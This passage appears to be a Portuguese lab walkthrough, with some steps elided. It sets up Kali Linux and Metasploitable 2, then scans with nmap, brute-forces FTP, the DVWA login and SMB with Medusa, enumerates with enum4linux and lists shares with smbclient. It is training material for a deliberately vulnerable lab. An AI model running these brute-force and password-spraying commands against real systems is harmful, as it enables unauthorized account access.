...
- no Metasploitable 2, faça login com o usuário "msfadmin" e a senha "msfadmin".
- coloque `ìfconfig` no terminal do Metasploitable 2 para descobrir o endereço IP da máquina.
- Anote o endereço IP do Metasploitable 2 (ex:192.168.56.101).
- No Kali Linux, faça login com o usuário "Kali" e a senha "Kali".
- coloque `ping -c 3 [ip do Metasploitable 2]` no terminal do Kali Linux para verificar se a conexão entre as máquinas está funcionando.
- Se você receber respostas, a conexão está funcionando corretamente.
## Passo 3 - Escaneando a máquina vulnerável
- No Kali Linux, abra o terminal e digite o comando `nmap -sV [ip do Metasploitable 2]` para escanear as portas abertas e os serviços em execução.
...
- No Kali Linux, digite o comando `medusa -h [ip do Metasploitable 2] -U users.txt -P passwords.txt -M ftp` para iniciar o ataque de força bruta no serviço FTP.
...
- No Kali Linux, entre no navegador e digite o endereço `http://[ip do Metasploitable 2]/dvwa/login.php` para acessar a página web do Metasploitable 2.
...
- no Kali Linux coloque `medusa -h [ip do Metasploitable 2] -U users.txt -P passwords.txt -M http \ -m  PAGE:'/dvwa/login.php' \
...
- no Kali Linux, coloque o comando `enum4linux -a [ip do Metasploitable 2] > enum4_output.txt`.  o -a vai fazer uma varredura completa., já o | enum4_output.txt vai salvar a saída em um arquivo chamado enum4_output.txt para análise posterior.
...
- no Kali Linux, coloque o comando `medusa -h [ip do Metasploitable 2] -U smb_users.txt -P smb_passwords.txt -M smb` para iniciar o ataque de password spraying no serviço SMB do Metasploitable 2.
- aguarde enquanto o medusa tenta combinar os nomes de usuário e senhas do dicionário.
- se o ataque for bem-sucedido, você verá uma mensagem indicando o nome de usuário e a senha corretos.

![](.img/image.png)
- agora vamos verificar se conseguimos acessar o compartilhamento SMB com as credenciais obtidas.
- no Kali Linux, coloque o comando `smbclient -L //[ip do Metasploitable 2] -U [usuário]` para listar os compartilhamentos disponíveis no serviço SMB.
